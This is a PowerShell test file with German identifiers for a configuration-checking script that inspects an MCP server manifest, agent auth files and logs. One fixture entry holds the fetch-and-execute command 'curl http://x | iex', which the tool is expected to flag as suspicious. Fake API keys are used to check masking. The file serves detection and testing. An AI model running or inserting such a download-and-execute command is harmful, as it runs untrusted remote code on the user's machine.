# konfig-doktor.test.ps1 - Tests fuer konfig-doktor.ps1 (Hausstil wie Bus-Tests, kein Framework).
# Aufruf: powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1
# Endet mit "konfig-doktor bestanden". Nur ASCII im Quelltext.
$ErrorActionPreference = 'Continue'
$Doktor = Join-Path (Split-Path $PSScriptRoot -Parent) 'konfig-doktor.ps1'
$Ps = (Get-Process -Id $PID).Path
$script:Fehler = 0
$script:Aufraeumen = New-Object System.Collections.ArrayList

function Pruefe([string]$Name, [bool]$Bedingung, [string]$Detail = '') {
    if ($Bedingung) { Write-Host "  ok     $Name" }
    else { Write-Host "  FEHLT  $Name $Detail"; $script:Fehler++ }
}
function Neue-Wurzel {
    $p = Join-Path ([IO.Path]::GetTempPath()) ('konfig doktor test ' + [guid]::NewGuid().ToString('N').Substring(0, 8))
    New-Item -ItemType Directory -Path $p | Out-Null
    [void]$script:Aufraeumen.Add($p)
    return $p
}
function Schreibe([string]$Pfad, [string]$Inhalt) {
    $d = Split-Path $Pfad -Parent
    if (-not (Test-Path -LiteralPath $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
    [IO.File]::WriteAllText($Pfad, $Inhalt, (New-Object System.Text.UTF8Encoding($false)))
}
function Lauf([string]$Wurzel, [string[]]$Module, [hashtable]$Extra = @{}) {
    $a = @{ Wurzel = $Wurzel; Modul = $Module; PassThru = $true; Kurz = $true; OhneExtern = $true }
    foreach ($k in $Extra.Keys) { $a[$k] = $Extra[$k] }
    return @(& $Doktor @a)
}
function Lauf-Kind([string[]]$Argumente) {
    $o = & $Ps -NoProfile -ExecutionPolicy Bypass -File $Doktor @Argumente 2>&1 | Out-String
    return [pscustomobject]@{ Exit = $LASTEXITCODE; Out = $o }
}
function Hat($Befunde, [string]$Id) { return (@($Befunde | Where-Object { $_.id -eq $Id }).Count -gt 0) }
function Schwere-Von($Befunde, [string]$Id) { return (@($Befunde | Where-Object { $_.id -eq $Id }) | Select-Object -First 1).schwere }

Write-Host '--- Geruest ---'
$fx = Neue-Wurzel
$r = Lauf $fx @('selbsttest-fehler')
Pruefe 'Modulfehler wird isoliert (UNKLAR)' ((Hat $r 'PRUEFUNG-FEHLGESCHLAGEN-selbsttest-fehler') -and ((Schwere-Von $r 'PRUEFUNG-FEHLGESCHLAGEN-selbsttest-fehler') -eq 'UNKLAR'))
$r = Lauf $fx @('selbsttest-langsam') @{ ModulLimitSek = 1 }
Pruefe 'Zeitlimit ergibt UNKLAR' ((Hat $r 'ZEITLIMIT-selbsttest-langsam') -and ((Schwere-Von $r 'ZEITLIMIT-selbsttest-langsam') -eq 'UNKLAR'))
$r = Lauf $fx @('selbsttest-fehler', 'selbsttest-kritisch')
Pruefe 'Fehler in Modul A stoppt Modul B nicht' ((Hat $r 'TEST-KRITISCH') -and (Hat $r 'PRUEFUNG-FEHLGESCHLAGEN-selbsttest-fehler'))
Pruefe 'KRITISCH steht vor UNKLAR' ($r[0].schwere -eq 'KRITISCH')
$b = $r | Where-Object { $_.id -eq 'TEST-KRITISCH' }
Pruefe 'Maske entfernt Schluessel aus Beleg' (($b.beleg -notmatch 'sk-abcdefghijklmnopqrstuvwxyz123456') -and ($b.beleg -match '\*\*\*'))

$k = Lauf-Kind @('-Wurzel', $fx, '-Modul', 'selbsttest-kritisch', '-BerichtOrdner', $fx)
Pruefe 'Exit 1 bei KRITISCH' ($k.Exit -eq 1) "Exit=$($k.Exit)"
$bericht = Join-Path $fx ('konfig-doktor-' + (Get-Date -Format 'yyyy-MM-dd') + '.md')
Pruefe 'Bericht wird geschrieben' (Test-Path -LiteralPath $bericht)
$bt = ''
if (Test-Path -LiteralPath $bericht) { $bt = [IO.File]::ReadAllText($bericht) }
Pruefe 'Bericht hat Stufen-Abschnitt' ($bt -match '## KRITISCH \(1\)')
Pruefe 'Bericht ohne Schluessel' (($bt -notmatch 'sk-abcdefghijklmnopqrstuvwxyz123456') -and ($bt -match '\*\*\*'))
$fx2 = Neue-Wurzel
$k = Lauf-Kind @('-Wurzel', $fx2, '-Modul', 'selbsttest-kritisch', '-Kurz')
Pruefe 'Kurz: Zaehlzeile' ($k.Out -match 'konfig-doktor: KRITISCH 1 \| WARNUNG 0 \| HINWEIS 0 \| UNKLAR 0')
Pruefe 'Kurz: kein Bericht' (-not (Test-Path -LiteralPath (Join-Path $fx2 'Werkstatt')) -and @(Get-ChildItem -LiteralPath $fx2 -Filter 'konfig-doktor-*.md').Count -eq 0)
$k = Lauf-Kind @('-Wurzel', $fx2, '-Modul', 'selbsttest-fehler', '-Kurz')
Pruefe 'Exit 0 ohne KRITISCH' ($k.Exit -eq 0) "Exit=$($k.Exit)"
$k = Lauf-Kind @('-Wurzel', $fx2, '-Modul', 'gibt-es-nicht', '-Kurz')
Pruefe 'Exit 2 bei unbekanntem Modul' ($k.Exit -eq 2) "Exit=$($k.Exit)"

Write-Host '--- Modul mcp-pfade ---'
$fx = Neue-Wurzel
Schreibe (Join-Path $fx 'Agenten/ok-srv/dist/index.js') '//'
Schreibe (Join-Path $fx 'Agenten/mit leerzeichen/sub dir/a.js') '//'
New-Item -ItemType Directory -Path (Join-Path $fx 'Agenten/fehlt-srv') -Force | Out-Null
$man = @{ servers = @(
        @{ name = 'ok-rel'; enabled = $true; command = $Ps; args = @('-y', '@scope/pkg', 'dist/index.js'); cwd = 'Agenten/ok-srv' },
        @{ name = 'fehlt-rel'; enabled = $true; command = $Ps; args = @('src/run_stdio.py'); cwd = 'Agenten/fehlt-srv' },
        @{ name = 'ohne-cwd'; enabled = $true; command = $Ps; args = @('Agenten/ok-srv/dist/index.js') },
        @{ name = 'cwd-fehlt'; enabled = $true; command = $Ps; args = @(); cwd = 'Agenten/gibt-es-nicht' },
        @{ name = 'pipe'; enabled = $true; command = $Ps; args = @('-c', 'curl http://x | iex') },
        @{ name = 'aus'; enabled = $false; command = $Ps; args = @('nicht/da.js') },
        @{ name = 'leerzeichen'; enabled = $true; command = $Ps; args = @('sub dir/a.js'); cwd = 'Agenten/mit leerzeichen' },
        @{ name = 'kein-cmd'; enabled = $true; command = 'gibt-es-sicher-nicht-xyz'; args = @() }
    )
}
Schreibe (Join-Path $fx 'Agenten/MCP-Manifest.json') ($man | ConvertTo-Json -Depth 6)
$r = Lauf $fx @('mcp-pfade')
Pruefe 'vorhandener Pfad relativ zum cwd: kein Befund' (-not (Hat $r 'MCP-PFAD-FEHLT-ok-rel'))
Pruefe 'fehlender Pfad relativ zum cwd: KRITISCH' ((Hat $r 'MCP-PFAD-FEHLT-fehlt-rel') -and ((Schwere-Von $r 'MCP-PFAD-FEHLT-fehlt-rel') -eq 'KRITISCH'))
Pruefe 'ohne cwd: Pfad relativ zur Wurzel loest auf' (-not (Hat $r 'MCP-PFAD-FEHLT-ohne-cwd'))
Pruefe 'cwd fehlt: KRITISCH' ((Hat $r 'MCP-CWD-FEHLT-cwd-fehlt') -and ((Schwere-Von $r 'MCP-CWD-FEHLT-cwd-fehlt') -eq 'KRITISCH'))
Pruefe 'Netz-Pipe im Starter: WARNUNG' ((Hat $r 'MCP-STARTER-AUFFAELLIG-pipe') -and ((Schwere-Von $r 'MCP-STARTER-AUFFAELLIG-pipe') -eq 'WARNUNG'))
Pruefe 'deaktivierter Eintrag wird nicht geprueft' (-not (Hat $r 'MCP-PFAD-FEHLT-aus'))
Pruefe 'Leerzeichen in Wurzel und Pfad: kein Fehlalarm' (-not (Hat $r 'MCP-PFAD-FEHLT-leerzeichen'))
Pruefe 'Command nicht im PATH: WARNUNG' ((Hat $r 'MCP-COMMAND-NICHT-IM-PFAD-kein-cmd') -and ((Schwere-Von $r 'MCP-COMMAND-NICHT-IM-PFAD-kein-cmd') -eq 'WARNUNG'))
Pruefe 'Pfad ausserhalb der Wurzel: HINWEIS' ((Hat $r 'MCP-AUSSERHALB-WURZEL') -and ((Schwere-Von $r 'MCP-AUSSERHALB-WURZEL') -eq 'HINWEIS'))
$fx2 = Neue-Wurzel
$r = Lauf $fx2 @('mcp-pfade')
Pruefe 'Manifest fehlt: KRITISCH' ((Hat $r 'MCP-MANIFEST-FEHLT') -and ((Schwere-Von $r 'MCP-MANIFEST-FEHLT') -eq 'KRITISCH'))
Schreibe (Join-Path $fx2 'Agenten/MCP-Manifest.json') '{ kaputt'
$r = Lauf $fx2 @('mcp-pfade')
Pruefe 'Manifest kaputt: KRITISCH ohne Absturz' ((Hat $r 'MCP-MANIFEST-DEFEKT') -and (-not (Hat $r 'PRUEFUNG-FEHLGESCHLAGEN-mcp-pfade')))

Write-Host '--- mcp-pfade: Fix-Runde 1 ---'
function Status-Von($Befunde, [string]$Id) { return (@($Befunde | Where-Object { $_.id -eq $Id }) | Select-Object -First 1).status }
function Hat-Praefix($Befunde, [string]$Praefix) { return (@($Befunde | Where-Object { $_.id.StartsWith($Praefix) }).Count -gt 0) }
$fx = Neue-Wurzel
New-Item -ItemType Directory -Path (Join-Path $fx 'Agenten/sub') -Force | Out-Null
Schreibe (Join-Path $fx 'x/y.js') '//'
$man = @{ servers = @(
        @{ name = 'flagwert'; enabled = $true; command = 'powershell'; args = @('--config', 'cfg/fehlt.toml', '--log=logs/a.log') },
        @{ name = 'skript-fehlt'; enabled = $true; command = 'powershell'; args = @('fehlt.py') },
        @{ name = 'kurzflag'; enabled = $true; command = 'powershell'; args = @('-u', 'srv.py') },
        @{ name = 'nurwurzel'; enabled = $true; command = 'powershell'; args = @('x/y.js'); cwd = 'Agenten/sub' },
        @{ name = 'paket'; enabled = $true; command = 'npx'; args = @('-y', 'github:user/repo', 'user/repo') }
    )
}
Schreibe (Join-Path $fx 'Agenten/MCP-Manifest.json') ($man | ConvertTo-Json -Depth 6)
$r = Lauf $fx @('mcp-pfade')
Pruefe '(1) Pfad hinter --flag fehlt: WARNUNG/Vermutung, nicht KRITISCH' ((-not (Hat $r 'MCP-PFAD-FEHLT-flagwert')) -and ((Schwere-Von $r 'MCP-PFAD-OPTIONAL-FEHLT-flagwert') -eq 'WARNUNG') -and ((Status-Von $r 'MCP-PFAD-OPTIONAL-FEHLT-flagwert') -eq 'Vermutung'))
$b = @($r | Where-Object { $_.id -eq 'MCP-PFAD-OPTIONAL-FEHLT-flagwert' }) | Select-Object -First 1
Pruefe '(1) --x=wert wird als Flag-Wert erkannt' (($null -ne $b) -and ($b.beleg -match 'logs/a\.log') -and ($b.beleg -match 'cfg/fehlt\.toml'))
Pruefe '(1) positionales Skript fehlt: KRITISCH' ((Schwere-Von $r 'MCP-PFAD-FEHLT-skript-fehlt') -eq 'KRITISCH')
Pruefe '(1) Skript nach Kurz-Flag bleibt KRITISCH' ((Schwere-Von $r 'MCP-PFAD-FEHLT-kurzflag') -eq 'KRITISCH')
Pruefe '(2) Pfad nur gegen Wurzel: WARNUNG NUR-WURZEL' (((Schwere-Von $r 'MCP-PFAD-NUR-WURZEL-nurwurzel') -eq 'WARNUNG') -and (-not (Hat $r 'MCP-PFAD-FEHLT-nurwurzel')))
Pruefe '(c) Paketbezeichner bei npx sind keine Pfade' ((-not (Hat-Praefix $r 'MCP-PFAD-FEHLT-paket')) -and (-not (Hat-Praefix $r 'MCP-PFAD-OPTIONAL-FEHLT-paket')) -and (-not (Hat-Praefix $r 'MCP-PFAD-NUR-WURZEL-paket')))

$fx = Neue-Wurzel
$geschwister = $fx + '2'
[void]$script:Aufraeumen.Add($geschwister)
Schreibe (Join-Path $geschwister 'srv.js') '//'
$man = @{ servers = @(@{ name = 'geschwister'; enabled = $true; command = 'powershell'; args = @((Join-Path $geschwister 'srv.js')) }) }
Schreibe (Join-Path $fx 'Agenten/MCP-Manifest.json') ($man | ConvertTo-Json -Depth 6)
$r = Lauf $fx @('mcp-pfade')
Pruefe '(a) Geschwisterordner mit gleichem Praefix gilt als ausserhalb' (Hat $r 'MCP-AUSSERHALB-WURZEL')

$fx = Neue-Wurzel
Schreibe (Join-Path $fx 'Agenten/MCP-Manifest.json') '{ "servers": [] }'
$stub = Join-Path $fx 'Agenten/mcp-sync-check.ps1'
Schreibe $stub "Write-Output 'Kopf 1'`nWrite-Output 'Kopf 2'`nWrite-Output 'Kopf 3'`nWrite-Output '  FEHLER server x fehlt'`nexit 1`n"
$r = Lauf $fx @('mcp-pfade') @{ OhneExtern = $false }
$b = @($r | Where-Object { $_.id -eq 'MCP-SYNC-ABWEICHUNG' }) | Select-Object -First 1
Pruefe '(3) Abweichungs-Beleg zeigt FEHLER-Zeile statt Kopf' (($null -ne $b) -and ($b.beleg -match 'FEHLER server x') -and ($b.beleg -notmatch 'Kopf 1')) "beleg=$($b.beleg)"
Schreibe $stub "Write-Output 'Kopf 1'`nWrite-Output 'Kopf 2'`nexit 1`n"
$r = Lauf $fx @('mcp-pfade') @{ OhneExtern = $false }
$b = @($r | Where-Object { $_.id -eq 'MCP-SYNC-ABWEICHUNG' }) | Select-Object -First 1
Pruefe '(3) ohne FEHLER/WARN: erste Zeilen als Beleg' (($null -ne $b) -and ($b.beleg -match 'Kopf 1')) "beleg=$($b.beleg)"
Schreibe $stub "Start-Sleep -Seconds 7`nexit 0`n"
$r = Lauf $fx @('mcp-pfade') @{ OhneExtern = $false; ModulLimitSek = 8 }
$b = @($r | Where-Object { $_.id -eq 'MCP-SYNC-ZEITLIMIT' }) | Select-Object -First 1
Pruefe '(b) Sync-Zeitlimit liegt unter dem Modul-Limit (5 s)' (($null -ne $b) -and ($b.beleg -match 'nach 5 s') -and (-not (Hat $r 'ZEITLIMIT-mcp-pfade'))) "ids=$(($r | ForEach-Object { $_.id }) -join ',')"

Write-Host '--- Modul hermes ---'
$fx = Neue-Wurzel
$h = Join-Path $fx 'Agenten/Hermes'
Schreibe (Join-Path $h 'config.yaml') ('x' * 100)
Schreibe (Join-Path $h 'config.yaml.bak-20260101') ('x' * 1000)
Schreibe (Join-Path $h 'auth.json') '{"providers":{"demo":{"access_token":"FAKE-SECRET-VALUE-ABC123XYZ","expires_at":"2020-01-01T00:00:00Z"}}}'
Schreibe (Join-Path $h 'auth.json.corrupt') 'zzz'
Schreibe (Join-Path $h 'profiles/mit/config.yaml') 'a: 1'
New-Item -ItemType Directory -Path (Join-Path $h 'profiles/ohne') -Force | Out-Null
Schreibe (Join-Path $h 'logs/errors.log') ("ok`nERROR erster`nERROR zweiter token sk-abcdefghijklmnopqrstuvwxyz123456`nINFO fertig`n")
$r = Lauf $fx @('hermes')
$alles = ($r | ConvertTo-Json -Depth 4)
Pruefe 'Config-Schrumpfung wird als UNKLAR gemeldet' ((Hat $r 'HERMES-CONFIG-GESCHRUMPFT') -and ((Schwere-Von $r 'HERMES-CONFIG-GESCHRUMPFT') -eq 'UNKLAR'))
Pruefe 'abgelaufene expires_at: WARNUNG' ((Hat $r 'HERMES-AUTH-ABGELAUFEN') -and ((Schwere-Von $r 'HERMES-AUTH-ABGELAUFEN') -eq 'WARNUNG'))
Pruefe 'kein Auth-Wert in irgendeinem Befund' ($alles -notmatch 'FAKE-SECRET-VALUE')
Pruefe 'kein Log-Schluessel in irgendeinem Befund' ($alles -notmatch 'sk-abcdefghijklmnopqrstuvwxyz123456')
Pruefe '.corrupt-Reste: HINWEIS' ((Hat $r 'HERMES-CORRUPT-RESTE') -and ((Schwere-Von $r 'HERMES-CORRUPT-RESTE') -eq 'HINWEIS'))
Pruefe 'Profil ohne Config: HINWEIS' (Hat $r 'HERMES-PROFILE-OHNE-CONFIG')
Pruefe 'Logfehler gezaehlt: HINWEIS' ((Hat $r 'HERMES-LOGFEHLER') -and ((Schwere-Von $r 'HERMES-LOGFEHLER') -eq 'HINWEIS'))
Pruefe 'gesunde Config + gueltige Auth: kein AUTH-DEFEKT' (-not (Hat $r 'HERMES-AUTH-DEFEKT'))
Schreibe (Join-Path $h 'auth.json') '{ kaputt FAKE-SECRET-VALUE-ABC123XYZ'
$r = Lauf $fx @('hermes')
$alles = ($r | ConvertTo-Json -Depth 4)
Pruefe 'kaputte auth.json: KRITISCH' ((Hat $r 'HERMES-AUTH-DEFEKT') -and ((Schwere-Von $r 'HERMES-AUTH-DEFEKT') -eq 'KRITISCH'))
Pruefe 'kaputte auth.json: Inhalt nicht ausgegeben' ($alles -notmatch 'FAKE-SECRET-VALUE')
Remove-Item -LiteralPath (Join-Path $h 'auth.json')
$r = Lauf $fx @('hermes')
Pruefe 'auth.json fehlt, .corrupt da: KRITISCH' ((Hat $r 'HERMES-AUTH-FEHLT') -and ((Schwere-Von $r 'HERMES-AUTH-FEHLT') -eq 'KRITISCH'))
$fx2 = Neue-Wurzel
$r = Lauf $fx2 @('hermes')
Pruefe 'kein Hermes-Ordner: UNKLAR statt Fehler' ((Hat $r 'HERMES-ORDNER-FEHLT') -and ((Schwere-Von $r 'HERMES-ORDNER-FEHLT') -eq 'UNKLAR'))

# === ENDE (neue Testabschnitte oberhalb dieser Zeile einfuegen) ===
foreach ($p in $script:Aufraeumen) { Remove-Item -LiteralPath $p -Recurse -Force -ErrorAction SilentlyContinue }
if ($script:Fehler -gt 0) { Write-Host "konfig-doktor FEHLGESCHLAGEN: $($script:Fehler) Pruefung(en)"; exit 1 }
Write-Host 'konfig-doktor bestanden'
